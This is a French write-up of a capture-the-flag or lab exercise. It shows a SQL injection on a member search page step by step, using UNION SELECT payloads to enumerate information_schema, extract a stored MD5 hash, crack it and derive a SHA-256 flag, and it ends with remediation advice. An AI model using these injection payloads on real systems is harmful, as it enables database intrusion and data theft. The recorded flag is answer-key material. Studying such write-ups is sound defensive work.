# SQL Injection — Page Members

## Faille
Injection SQL via le paramètre `id` de la page de recherche de membres.

## Catégorie OWASP
A03:2021 — Injection

## Comment trouver la faille

1. La page `?page=member` contient un formulaire de recherche par ID.
2. En entrant `1`, on obtient un résultat normal : `First name: one / Surname: me`.
3. En entrant `1 OR 1=1`, on obtient tous les utilisateurs, dont un suspect :
   `First name: Flag / Surname: GetThe`.
4. Cela confirme que l'input est injecté directement dans la requête SQL sans
   échappement ni préparation de requête.

## Exploitation étape par étape

### Étape 1 — Déterminer le nombre de colonnes
```
1 UNION SELECT 1,2
```
Résultat : `First name: 1 / Surname: 2` → 2 colonnes.

### Étape 2 — Lister les tables et colonnes
```
1 UNION SELECT table_name,column_name FROM information_schema.columns
```
On découvre la table `users` avec les colonnes : `user_id`, `first_name`, `last_name`,
`town`, `country`, `planet`, `Commentaire`, `countersign`.

### Étape 3 — Extraire les données sensibles
```
1 UNION SELECT Commentaire,countersign FROM users
```
Résultats :
- Utilisateur "Flag/GetThe" :
  - Commentaire : `Decrypt this password -> then lower all the char. Sh256 on it and it's good !`
  - Countersign : `5ff9d0165b4f92b14994e5c685cdce28`

### Étape 4 — Cracker le MD5
```bash
echo -n "FortyTwo" | md5sum
# Résultat : 5ff9d0165b4f92b14994e5c685cdce28 ✓
```

### Étape 5 — Suivre les instructions
1. Mettre en minuscules : `fortytwo`
2. Hasher en SHA-256 :
```bash
echo -n "fortytwo" | sha256sum
# Résultat : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## Flag
`10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

## Comment corriger

1. **Utiliser des requêtes préparées (prepared statements) avec des paramètres liés** :
   ```php
   $stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
   $stmt->execute([$id]);
   ```

2. **Valider et typer les entrées** : l'ID devrait être un entier. Rejeter toute valeur
   non numérique avant même d'exécuter la requête.

3. **Appliquer le principe du moindre privilège** : l'utilisateur de la base de données
   utilisé par l'application web ne devrait pas avoir accès à `information_schema`
   ni à d'autres bases de données.

4. **Ne jamais stocker de mots de passe en MD5** : utiliser bcrypt ou Argon2 avec un sel.

5. **Ne pas stocker d'instructions de déchiffrement à côté du mot de passe.**
